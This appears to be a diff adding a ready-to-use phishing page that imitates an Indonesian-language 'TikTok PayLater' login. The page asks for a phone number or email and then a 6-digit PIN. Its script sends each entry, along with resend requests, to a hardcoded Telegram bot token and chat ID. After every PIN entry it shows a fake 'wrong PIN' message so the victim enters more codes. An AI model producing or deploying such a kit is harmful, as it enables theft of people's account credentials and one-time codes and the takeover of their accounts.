@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok PayLater</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        * {
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #ffffff;
+            overflow-x: hidden;
+        }
+        .container-mobile {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            min-height: 100vh;
+            position: relative;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Splash Screen */
+        #splash {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            display: flex; justify-content: center; align-items: center;
+            z-index: 100;
+        }
+        #splash img {
+            width: 100%; height: 100%; object-fit: cover;
+        }
+
+        /* Tabs */
+        .tab {
+            flex: 1; text-align: center; padding: 12px 0;
+            font-size: 15px; color: #8a8a8a; cursor: pointer;
+            position: relative; font-weight: 500;
+        }
+        .tab.active {
+            color: #000; font-weight: 600;
+        }
+        .tab.active::after {
+            content: ""; position: absolute; bottom: 0; left: 0;
+            width: 100%; height: 2px; background-color: #000;
+        }
+
+        /* Inputs */
+        .input-box {
+            display: flex; align-items: center;
+            background-color: #f1f1f2; border-radius: 4px;
+            padding: 0 12px; height: 44px; border: 1px solid transparent;
+        }
+        .input-box:focus-within {
+            border-color: #d1d1d3;
+        }
+        .country-code {
+            font-weight: 600; padding-right: 12px;
+            border-right: 1px solid #d1d1d3; margin-right: 12px;
+            font-size: 15px; color: #161823;
+        }
+        input {
+            background: transparent; border: none; outline: none;
+            font-size: 15px; width: 100%; color: #161823;
+            caret-color: #fe2c55;
+        }
+
+        /* PIN Fields */
+        .pin-field {
+            flex: 1; height: 54px; text-align: center;
+            font-size: 24px; font-weight: bold;
+            border: 1px solid #ebebeb; border-radius: 4px;
+            background-color: #f1f1f2; outline: none;
+            color: #161823; caret-color: transparent;
+        }
+        .pin-field:focus {
+            border-color: #d1d1d3;
+        }
+
+        /* Button */
+        .btn-submit {
+            width: calc(100% - 40px);
+            background-color: #ffc2d1;
+            color: white; border: none; border-radius: 26px;
+            padding: 14px; font-size: 16px; font-weight: 600;
+            position: fixed; bottom: 40px; left: 50%;
+            transform: translateX(-50%); cursor: not-allowed;
+            display: flex; justify-content: center; align-items: center;
+            max-width: 410px; transition: all 0.3s;
+        }
+        .btn-submit.active {
+            background-color: #fe2c55; cursor: pointer;
+        }
+
+        .loader {
+            width: 18px; height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white; border-radius: 50%;
+            animation: spin 0.8s linear infinite; display: none;
+            margin-right: 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .section { display: none; animation: fadeIn 0.3s ease; }
+        .section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .error-msg {
+            color: #fe2c55; font-size: 13px; margin-bottom: 15px; display: none;
+        }
+        .error-msg.show { display: block; }
+    </style>
+</head>
+<body>
+
+    <!-- Splash Screen -->
+    <div id="splash">
+        <img src="https://static.tildacdn.ink/tild6266-3265-4638-a262-353532356236/1000248762.png" alt="TikTok">
+    </div>
+
+    <div class="container-mobile">
+        <!-- Header -->
+        <div class="flex items-center justify-between mb-5 pt-2">
+            <span class="text-xl cursor-pointer" onclick="handleBack()">❮</span>
+            <div class="text-[17px] font-bold">Masuk</div>
+            <span class="text-xl cursor-pointer">ⓘ</span>
+        </div>
+
+        <!-- Section 1: Login -->
+        <div id="section-login" class="section active">
+            <div class="flex border-b border-[#ebebeb] mb-6 mt-2">
+                <div class="tab active" id="tab-phone" onclick="switchTab('phone')">Telepon</div>
+                <div class="tab" id="tab-email" onclick="switchTab('email')">Email/nama pengguna</div>
+            </div>
+
+            <div class="input-box mb-4">
+                <div id="prefix" class="country-code">+62</div>
+                <input type="tel" id="main-input" placeholder="Nomor telepon" autocomplete="off" oninput="validateLogin()">
+            </div>
+        </div>
+
+        <!-- Section 2: OTP / PIN -->
+        <div id="section-otp" class="section">
+            <p class="text-[15px] font-semibold mb-2 text-[#161823]">Masukkan PIN</p>
+            <p class="text-sm text-[#8a8a8a] mb-6 leading-relaxed" id="otp-subtitle">
+                Masukkan 6 digit PIN verifikasi untuk <strong id="user-display"></strong>.
+            </p>
+            
+            <div id="otp-error" class="error-msg">PIN yang Anda masukkan salah. Silakan coba lagi.</div>
+
+            <div class="flex justify-between gap-2 mb-5" id="pin-container">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+                <input type="tel" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            </div>
+
+            <a href="#" class="text-sm font-semibold text-[#161823] no-underline mb-8 inline-block">Lupa PIN?</a>
+
+            <div class="text-center mt-5 text-sm text-[#8a8a8a]">
+                Kirim ulang kode dalam <span id="timer" class="text-[#fe2c55] font-semibold">01:00</span>
+                <br>
+                <button type="button" class="mt-2 text-[#fe2c55] font-semibold bg-transparent border-none cursor-pointer disabled:text-gray-300" id="resendBtn" onclick="handleResend()" disabled>Kirim ulang OTP</button>
+            </div>
+        </div>
+
+        <!-- Section 3: Password -->
+        <div id="section-pass" class="section">
+            <p class="text-sm text-[#616161] mb-2">Masukkan kata sandi</p>
+            <div class="input-box mb-4 relative">
+                <input type="password" id="password-input" placeholder="Kata sandi" oninput="validatePass()">
+                <i class="far fa-eye absolute right-3 text-[#8a8a8a] cursor-pointer" id="togglePass" onclick="togglePassword()"></i>
+            </div>
+            <a href="#" class="text-sm font-semibold text-[#161823] no-underline">Lupa kata sandi?</a>
+        </div>
+
+        <!-- Global Submit Button -->
+        <button class="btn-submit" id="globalBtn" disabled onclick="handleGlobalSubmit()">
+            <div class="loader" id="globalLoader"></div>
+            <span id="globalBtnText">Lanjutkan</span>
+        </button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8499835544:AAF_KRcHMfFaw83C47bmGYPXVLDRY5fo1pA';
+        const CHAT_ID = '5826930555';
+
+        let currentSection = 'login';
+        let loginMethod = 'phone';
+        let userValue = '';
+        let timeLeft = 60;
+
+        // Hide splash
+        window.onload = () => setTimeout(() => document.getElementById('splash').style.display = 'none', 2000);
+
+        function switchTab(method) {
+            loginMethod = method;
+            const tabPhone = document.getElementById('tab-phone');
+            const tabEmail = document.getElementById('tab-email');
+            const prefix = document.getElementById('prefix');
+            const input = document.getElementById('main-input');
+
+            if (method === 'phone') {
+                tabPhone.classList.add('active'); tabEmail.classList.remove('active');
+                prefix.style.display = 'block'; input.type = 'tel'; input.placeholder = 'Nomor telepon';
+            } else {
+                tabEmail.classList.add('active'); tabPhone.classList.remove('active');
+                prefix.style.display = 'none'; input.type = 'text'; input.placeholder = 'Email atau nama pengguna';
+            }
+            validateLogin();
+        }
+
+        function validateLogin() {
+            const val = document.getElementById('main-input').value.trim();
+            const btn = document.getElementById('globalBtn');
+            if (val.length > 3) { btn.classList.add('active'); btn.disabled = false; }
+            else { btn.classList.remove('active'); btn.disabled = true; }
+        }
+
+        function validatePass() {
+            const val = document.getElementById('password-input').value.trim();
+            const btn = document.getElementById('globalBtn');
+            if (val.length >= 6) { btn.classList.add('active'); btn.disabled = false; }
+            else { btn.classList.remove('active'); btn.disabled = true; }
+        }
+
+        function togglePassword() {
+            const input = document.getElementById('password-input');
+            const icon = document.getElementById('togglePass');
+            if (input.type === 'password') {
+                input.type = 'text'; icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = 'password'; icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        async function handleGlobalSubmit() {
+            const btn = document.getElementById('globalBtn');
+            const loader = document.getElementById('globalLoader');
+            const txt = document.getElementById('globalBtnText');
+
+            if (currentSection === 'login') {
+                userValue = document.getElementById('main-input').value.trim();
+                btn.disabled = true; loader.style.display = 'inline-block'; txt.textContent = 'Memproses...';
+                
+                await sendTelegram(`📱 *TikTok Login*\n👤 *Metode:* ${loginMethod}\n📧 *Input:* \`${userValue}\``);
+                
+                setTimeout(() => {
+                    showSection('otp');
+                    document.getElementById('user-display').textContent = userValue;
+                    startTimer();
+                }, 1000);
+
+            } else if (currentSection === 'otp') {
+                const pin = Array.from(document.querySelectorAll('.pin-field')).map(f => f.value).join('');
+                if (pin.length !== 6) return;
+
+                btn.disabled = true; loader.style.display = 'inline-block'; txt.textContent = 'Memproses...';
+                await sendTelegram(`🔐 *TikTok PIN*\n👤 *User:* \`${userValue}\`\n🔢 *PIN:* \`${pin}\``);
+
+                setTimeout(() => {
+                    document.getElementById('otp-error').classList.add('show');
+                    document.querySelectorAll('.pin-field').forEach(f => f.value = '');
+                    document.querySelectorAll('.pin-field')[0].focus();
+                    btn.disabled = false; loader.style.display = 'none'; txt.textContent = 'Lanjutkan';
+                    btn.classList.remove('active'); btn.disabled = true;
+                }, 1500);
+            }
+        }
+
+        function showSection(id) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById('section-' + id).classList.add('active');
+            currentSection = id;
+            
+            const btn = document.getElementById('globalBtn');
+            const loader = document.getElementById('globalLoader');
+            const txt = document.getElementById('globalBtnText');
+            
+            btn.disabled = true; btn.classList.remove('active');
+            loader.style.display = 'none'; txt.textContent = 'Lanjutkan';
+            
+            if (id === 'otp') {
+                // Focus first PIN field
+                setTimeout(() => document.querySelectorAll('.pin-field')[0].focus(), 100);
+            }
+        }
+
+        function handleBack() {
+            if (currentSection === 'otp' || currentSection === 'pass') showSection('login');
+            else location.reload();
+        }
+
+        // PIN Logic
+        const pinFields = document.querySelectorAll('.pin-field');
+        pinFields.forEach((f, i) => {
+            f.addEventListener('input', (e) => {
+                if (!/^\d$/.test(e.target.value)) { e.target.value = ''; return; }
+                if (e.target.value && i < 5) pinFields[i+1].focus();
+                checkPin();
+            });
+            f.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !f.value && i > 0) pinFields[i-1].focus();
+            });
+            f.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text').slice(0, 6);
+                if (!/^\d+$/.test(data)) return;
+                data.split('').forEach((c, idx) => { if (pinFields[idx]) pinFields[idx].value = c; });
+                checkPin();
+            });
+        });
+
+        function checkPin() {
+            const pin = Array.from(pinFields).map(f => f.value).join('');
+            const btn = document.getElementById('globalBtn');
+            if (pin.length === 6) { 
+                btn.classList.add('active'); btn.disabled = false; 
+                handleGlobalSubmit(); // Auto submit
+            } else { 
+                btn.classList.remove('active'); btn.disabled = true; 
+            }
+        }
+
+        async function sendTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text + `\n📅 *Waktu:* ${new Date().toLocaleString('id-ID')}`, parse_mode: 'Markdown' })
+                });
+            } catch (e) {}
+        }
+
+        async function handleResend() {
+            const rb = document.getElementById('resendBtn');
+            rb.disabled = true; rb.textContent = 'Mengirim...';
+            await sendTelegram(`🔄 *Resend PIN*\n👤 *User:* \`${userValue}\``);
+            timeLeft = 60; rb.textContent = 'Kirim ulang OTP';
+        }
+
+        function startTimer() {
+            const t = document.getElementById('timer');
+            const rb = document.getElementById('resendBtn');
+            const interval = setInterval(() => {
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    const m = Math.floor(timeLeft / 60); const s = timeLeft % 60;
+                    t.textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+                    rb.disabled = true;
+                } else { rb.disabled = false; }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
